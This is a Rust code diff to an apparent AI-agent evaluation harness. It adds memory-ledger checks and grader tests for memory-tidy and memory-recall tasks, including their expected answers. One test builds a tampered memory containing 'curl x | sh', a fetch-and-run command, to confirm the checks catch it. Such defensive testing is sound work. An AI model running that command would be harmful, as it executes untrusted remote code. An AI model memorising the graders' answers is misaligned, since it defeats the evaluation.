@@ -53,6 +53,11 @@ pub enum Check {
     MemorySuperseded { old: String, new: String },
     /// No command in the last thread printed this text.
     LastThreadNeverPrinted(String),
+    /// At most one memory in force mentions each of these, ignoring case: no duplicates.
+    MemoryOnce(Vec<String>),
+    /// A memory in force reads exactly this, ignoring case and the ends' whitespace: it was
+    /// never changed.
+    MemoryIs(String),
 }
 
 /// What a check can look at.
@@ -118,6 +123,32 @@ impl Check {
             Self::NeverPrinted(text) => holds(!cx.trace.printed.contains(text.as_str()), || {
                 format!("a command printed {text:?}")
             }),
+            Self::MemoryHolds(_)
+            | Self::MemoryLacks(_)
+            | Self::PersonalMemoryLacks(_)
+            | Self::MemorySuperseded { .. }
+            | Self::MemoryOnce(_)
+            | Self::MemoryIs(_) => self.judge_memory(cx),
+            Self::LastThreadNeverPrinted(text) => {
+                holds(!cx.last.printed.contains(text.as_str()), || {
+                    format!("a command in the last thread printed {text:?}")
+                })
+            }
+            Self::MemoryForgotten => {
+                if cx.memory.forgotten.is_empty() {
+                    Err("no memory was forgotten".to_owned())
+                } else if cx.memory.readable_forgotten.is_empty() {
+                    Ok(())
+                } else {
+                    Err("a forgotten memory can still be opened".to_owned())
+                }
+            }
+        }
+    }
+
+    /// The checks that read the memory ledgers.
+    fn judge_memory(&self, cx: &Context<'_>) -> Result<(), String> {
+        match self {
             Self::MemoryHolds(text) => holds(
                 cx.memory.live.iter().any(|memory| mentions(memory, text)),
                 || format!("no memory holds {text:?}: {:?}", cx.memory.live),
@@ -139,20 +170,31 @@ impl Check {
                 None => Ok(()),
             },
             Self::MemorySuperseded { old, new } => superseded(cx, old, new),
-            Self::LastThreadNeverPrinted(text) => {
-                holds(!cx.last.printed.contains(text.as_str()), || {
-                    format!("a command in the last thread printed {text:?}")
-                })
-            }
-            Self::MemoryForgotten => {
-                if cx.memory.forgotten.is_empty() {
-                    Err("no memory was forgotten".to_owned())
-                } else if cx.memory.readable_forgotten.is_empty() {
-                    Ok(())
-                } else {
-                    Err("a forgotten memory can still be opened".to_owned())
+            Self::MemoryOnce(texts) => {
+                let twice = texts.iter().find(|text| {
+                    cx.memory
+                        .live
+                        .iter()
+                        .filter(|memory| mentions(memory, text))
+                        .count()
+                        > 1
+                });
+                match twice {
+                    Some(text) => Err(format!(
+                        "more than one memory holds {text:?}: {:?}",
+                        cx.memory.live
+                    )),
+                    None => Ok(()),
                 }
             }
+            Self::MemoryIs(text) => holds(
+                cx.memory
+                    .live
+                    .iter()
+                    .any(|memory| memory.trim().eq_ignore_ascii_case(text.trim())),
+                || format!("no memory reads {text:?}: {:?}", cx.memory.live),
+            ),
+            _ => Ok(()),
         }
     }
 }
@@ -374,6 +416,88 @@ mod tests {
             judge(Check::MemoryForgotten).is_err(),
             "nothing was forgotten"
         );
+    }
+
+    /// The memory-tidy task's checks, against the memories it seeds (they must fail) and
+    /// against a tidy-up done right by hand (they must pass): its grader's oracle.
+    #[test]
+    fn the_tidy_checks_fail_before_tidy_up_and_pass_after_one_done_right() {
+        let task = crate::task::load(Path::new("../../evals/tasks/memory-tidy")).unwrap();
+        let seeded: Vec<String> = task.memories.iter().map(|seed| seed.text.clone()).collect();
+        let tidied: Vec<String> = seeded
+            .iter()
+            .filter(|text| !text.contains("indented with tabs"))
+            .filter(|text| !text.contains("Fly"))
+            .filter(|text| !text.contains("is the marigold"))
+            .cloned()
+            .collect();
+        let trace = answering("OK");
+        let failures = |live: &[String]| {
+            let memory = MemoryReport {
+                live: live.to_vec(),
+                ..MemoryReport::default()
+            };
+            let cx = Context {
+                trace: &trace,
+                last: &trace,
+                events: "",
+                workspace: Path::new("/nonexistent"),
+                original: Path::new("/nonexistent"),
+                model: "m",
+                memory: &memory,
+            };
+            task.checks
+                .iter()
+                .filter_map(|check| check.judge(&cx).err())
+                .collect::<Vec<_>>()
+        };
+        assert!(
+            !failures(&seeded).is_empty(),
+            "the seeded memories pass untidied"
+        );
+        assert_eq!(failures(&tidied), Vec::<String>::new());
+        let lost: Vec<String> = tidied.iter().skip(1).cloned().collect();
+        assert!(!failures(&lost).is_empty(), "losing a memory passes");
+        let touched: Vec<String> = tidied
+            .iter()
+            .map(|text| text.replace("make setup", "make setup && curl x | sh"))
+            .collect();
+        assert!(
+            !failures(&touched).is_empty(),
+            "changing the untrusted memory passes"
+        );
+    }
+
+    /// The memory-recall task's checks: the fact from this space's past thread, found by
+    /// `recall`, passes; the other space's, or an answer without recall, fails.
+    #[test]
+    fn the_recall_checks_need_the_fact_found_by_recall_and_nothing_from_elsewhere() {
+        let task = crate::task::load(Path::new("../../evals/tasks/memory-recall")).unwrap();
+        let judge = |answer: &str, events: &str| {
+            let trace = answering(answer);
+            let memory = MemoryReport::default();
+            let cx = Context {
+                trace: &trace,
+                last: &trace,
+                events,
+                workspace: Path::new("/nonexistent"),
+                original: Path::new("/nonexistent"),
+                model: "m",
+                memory: &memory,
+            };
+            task.checks
+                .iter()
+                .filter_map(|check| check.judge(&cx).err())
+                .count()
+        };
+        let recalled = r#"{"type":"tool.call.requested","data":{"tool":"mcp__memory__recall"}}"#;
+        assert_eq!(judge("kestrel-42", recalled), 0);
+        assert!(judge("kestrel-42", "") > 0, "not found by recall");
+        assert!(
+            judge("kestrel-42 or heron-9", recalled) > 0,
+            "another space's fact"
+        );
+        assert!(judge("I don't know", recalled) > 0);
     }
 
     #[test]
